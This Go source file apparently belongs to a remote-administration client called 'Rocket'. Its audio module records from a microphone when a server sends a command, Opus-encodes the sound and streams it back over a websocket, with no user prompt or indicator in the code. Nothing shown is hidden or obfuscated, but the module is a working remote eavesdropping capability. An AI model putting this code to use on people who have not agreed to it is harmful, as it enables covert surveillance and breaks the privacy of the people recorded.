//go:build cgo
// +build cgo

package audio

import (
	"Rocket/client/common"
	"Rocket/modules"
	"encoding/base64"
	"errors"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gordonklaus/portaudio"
	"github.com/hraban/opus"
)

const (
	sampleRate      = 48000               // Opus standard sample rate
	channels        = 1                   // Mono for efficiency
	framesPerBuffer = 960                 // 20ms at 48kHz
	frameDuration   = 20 * time.Millisecond
	bitrate         = 64000               // 64 kbps
	complexity      = 10                  // Maximum quality
)

var (
	errNotInitialized = errors.New("audio not initialized")
	errAlreadyRunning = errors.New("audio already running")
	errNoConnection   = errors.New("no connection available")
)

// AudioSession represents an active audio streaming session
type AudioSession struct {
	uuid         string
	deviceIndex  int
	device       *portaudio.DeviceInfo
	stream       *portaudio.Stream
	encoder      *opus.Encoder
	audioData    chan []byte // Encoded audio data channel
	stop         chan struct{}
	senderStop   chan struct{}
	mu           sync.Mutex
	running      bool

	// Statistics
	seqNumber    uint32
	framesSent   uint64
	bytesSent    uint64
	errors       uint64
}

var (
	audioSession *AudioSession
	audioMutex   sync.Mutex
	initialized  bool
)

func init() {
	// Initialize PortAudio
	if err := portaudio.Initialize(); err != nil {
		fmt.Printf("[WARN] Failed to initialize PortAudio: %v\n", err)
		return
	}
	initialized = true
}

// ListDevices returns a list of available audio input devices
func ListDevices() ([]string, error) {
	if !initialized {
		return nil, errors.New("PortAudio not initialized")
	}

	devices, err := portaudio.Devices()
	if err != nil {
		return nil, fmt.Errorf("failed to get devices: %w", err)
	}

	var deviceList []string
	for i, device := range devices {
		if device.MaxInputChannels > 0 {
			deviceList = append(deviceList, fmt.Sprintf("%d: %s (Inputs: %d, Sample Rate: %.0f Hz)",
				i, device.Name, device.MaxInputChannels, device.DefaultSampleRate))
		}
	}

	if len(deviceList) == 0 {
		return nil, errors.New("no audio input devices found")
	}

	return deviceList, nil
}

// InitAudio initializes a new audio streaming session
func InitAudio(pack modules.Packet) error {
	audioMutex.Lock()
	defer audioMutex.Unlock()

	if !initialized {
		return errors.New("PortAudio not initialized")
	}

	if audioSession != nil && audioSession.running {
		return errAlreadyRunning
	}

	// Get audio UUID from packet
	audioUUID, ok := pack.Data[`audio`].(string)
	if !ok {
		return errors.New("missing audio UUID in packet")
	}

	// Create new audio session
	session := &AudioSession{
		uuid:       audioUUID,
		audioData:  make(chan []byte, 100), // Buffer for encoded audio
		stop:       make(chan struct{}),
		senderStop: make(chan struct{}),
	}

	audioSession = session
	fmt.Printf("[INFO] Audio session initialized: %s\n", audioUUID)
	return nil
}

// HandleSelect handles audio device selection and starts streaming
func HandleSelect(pack modules.Packet) error {
	audioMutex.Lock()
	defer audioMutex.Unlock()

	if !initialized {
		return errors.New("PortAudio not initialized")
	}

	if audioSession == nil {
		return errNotInitialized
	}

	// Get device ID from packet
	var deviceID int
	switch v := pack.Data[`device`].(type) {
	case float64:
		deviceID = int(v)
	case string:
		// Parse device ID from string format "N: Device Name..."
		if _, err := fmt.Sscanf(v, "%d:", &deviceID); err != nil {
			return fmt.Errorf("invalid device ID format: %w", err)
		}
	default:
		return errors.New("missing or invalid device ID")
	}

	// Get device info
	devices, err := portaudio.Devices()
	if err != nil {
		return fmt.Errorf("failed to get devices: %w", err)
	}

	if deviceID < 0 || deviceID >= len(devices) {
		return fmt.Errorf("invalid device index: %d (total devices: %d)", deviceID, len(devices))
	}

	device := devices[deviceID]
	if device.MaxInputChannels == 0 {
		return fmt.Errorf("device %s has no input channels", device.Name)
	}

	audioSession.deviceIndex = deviceID
	audioSession.device = device

	// Initialize Opus encoder
	encoder, err := opus.NewEncoder(sampleRate, channels, opus.AppVoIP)
	if err != nil {
		return fmt.Errorf("failed to create Opus encoder: %w", err)
	}
	encoder.SetBitrate(bitrate)   // 64 kbps
	encoder.SetComplexity(complexity) // Max quality
	// Note: SetVBR, SetInBandFEC, SetPacketLossPerc may not be available in all opus bindings
	// The encoder will use reasonable defaults
	audioSession.encoder = encoder

	// Start audio capture
	if err := startCapture(audioSession); err != nil {
		return fmt.Errorf("failed to start audio capture: %w", err)
	}

	// Start packet sender
	go audioPacketSender(audioSession)

	audioSession.running = true
	fmt.Printf("[INFO] Audio capture started on device: %s\n", device.Name)
	return nil
}

// audioPacketSender reads encoded audio from channel and sends packets to server
func audioPacketSender(session *AudioSession) {
	defer fmt.Printf("[INFO] Audio packet sender stopped\n")

	for {
		select {
		case <-session.senderStop:
			return
		case audioData, ok := <-session.audioData:
			if !ok {
				return
			}

			// Check connection
			common.Mutex.RLock()
			conn := common.WSConn
			common.Mutex.RUnlock()

			if conn == nil {
				atomic.AddUint64(&session.errors, 1)
				fmt.Printf("[WARN] No connection available, dropping audio frame\n")
				continue
			}

			// Increment sequence number
			seq := atomic.AddUint32(&session.seqNumber, 1)

			// Create packet with base64 encoded audio data
			packet := modules.Packet{
				Act: "AUDIO_DATA",
				Data: map[string]any{
					"uuid":      session.uuid,
					"data":      base64.StdEncoding.EncodeToString(audioData),
					"seq":       seq,
					"timestamp": time.Now().UnixMilli(),
					"size":      len(audioData),
				},
			}

			// Send packet
			if err := conn.SendPack(packet); err != nil {
				atomic.AddUint64(&session.errors, 1)
				fmt.Printf("[ERROR] Failed to send audio packet: %v\n", err)
			} else {
				atomic.AddUint64(&session.framesSent, 1)
				atomic.AddUint64(&session.bytesSent, uint64(len(audioData)))
			}
		}
	}
}

// startCapture starts the audio capture and encoding
func startCapture(session *AudioSession) error {
	// Use mono channel for efficiency
	captureChannels := 1
	if session.device.MaxInputChannels < captureChannels {
		captureChannels = session.device.MaxInputChannels
	}

	// Open audio stream
	streamParams := portaudio.StreamParameters{
		Input: portaudio.StreamDeviceParameters{
			Device:   session.device,
			Channels: captureChannels,
			Latency:  session.device.DefaultLowInputLatency,
		},
		SampleRate:      sampleRate,
		FramesPerBuffer: framesPerBuffer,
	}

	// Buffer to hold PCM samples
	buffer := make([]int16, framesPerBuffer*captureChannels)

	stream, err := portaudio.OpenStream(streamParams, buffer)
	if err != nil {
		return fmt.Errorf("failed to open stream: %w", err)
	}

	if err := stream.Start(); err != nil {
		stream.Close()
		return fmt.Errorf("failed to start stream: %w", err)
	}

	session.stream = stream

	// Start capture goroutine
	go captureLoop(session, buffer, captureChannels)

	return nil
}

// captureLoop continuously captures audio and encodes it
func captureLoop(session *AudioSession, buffer []int16, captureChannels int) {
	defer func() {
		if session.stream != nil {
			session.stream.Stop()
			session.stream.Close()
		}
		fmt.Printf("[INFO] Audio capture loop stopped\n")
	}()

	// Opus encoding buffer
	opusData := make([]byte, 4000)

	for {
		select {
		case <-session.stop:
			return
		default:
		}

		// Read audio from device
		if err := session.stream.Read(); err != nil {
			fmt.Printf("[ERROR] Audio read error: %v\n", err)
			time.Sleep(frameDuration)
			continue
		}

		// Convert int16 to float32 for Opus (mono)
		pcm := make([]float32, framesPerBuffer*channels)
		for i := 0; i < framesPerBuffer && i < len(buffer); i++ {
			pcm[i] = float32(buffer[i]) / 32768.0
		}

		// Encode with Opus
		n, err := session.encoder.EncodeFloat32(pcm, opusData)
		if err != nil {
			fmt.Printf("[ERROR] Opus encoding error: %v\n", err)
			continue
		}

		// Send encoded audio to channel
		encodedData := make([]byte, n)
		copy(encodedData, opusData[:n])

		select {
		case session.audioData <- encodedData:
			// Successfully queued
		default:
			// Channel full, drop frame
			fmt.Printf("[WARN] Audio data channel full, dropping frame\n")
		}
	}
}

// GetAudioData returns the channel for reading encoded audio data
func GetAudioData() <-chan []byte {
	audioMutex.Lock()
	defer audioMutex.Unlock()

	if audioSession == nil {
		return nil
	}
	return audioSession.audioData
}

// PingAudio handles keep-alive ping
func PingAudio(pack modules.Packet) {
	// Audio session is kept alive via the ping mechanism
	// No additional action needed
}

// KillAudio stops the audio streaming session
func KillAudio(pack modules.Packet) {
	audioMutex.Lock()
	defer audioMutex.Unlock()

	if audioSession == nil {
		return
	}

	audioSession.mu.Lock()
	wasRunning := audioSession.running
	if audioSession.running {
		close(audioSession.stop)
		close(audioSession.senderStop)
		audioSession.running = false
	}
	audioSession.mu.Unlock()

	if wasRunning {
		// Wait for capture loop to clean up
		time.Sleep(100 * time.Millisecond)
	}

	// Print statistics
	frames := atomic.LoadUint64(&audioSession.framesSent)
	bytes := atomic.LoadUint64(&audioSession.bytesSent)
	errors := atomic.LoadUint64(&audioSession.errors)
	fmt.Printf("[INFO] Audio session statistics - Frames: %d, Bytes: %d, Errors: %d\n",
		frames, bytes, errors)

	// Clean up resources
	if audioSession.audioData != nil {
		close(audioSession.audioData)
	}

	if audioSession.encoder != nil {
		audioSession.encoder = nil
	}

	audioSession = nil
	fmt.Printf("[INFO] Audio session killed\n")
}

// GetSessionUUID returns the current audio session UUID
func GetSessionUUID() string {
	audioMutex.Lock()
	defer audioMutex.Unlock()

	if audioSession == nil {
		return ""
	}
	return audioSession.uuid
}

// IsRunning returns whether audio is currently streaming
func IsRunning() bool {
	audioMutex.Lock()
	defer audioMutex.Unlock()

	return audioSession != nil && audioSession.running
}

// Cleanup cleans up PortAudio resources on shutdown
func Cleanup() {
	KillAudio(modules.Packet{})
	if initialized {
		portaudio.Terminate()
		initialized = false
	}
}
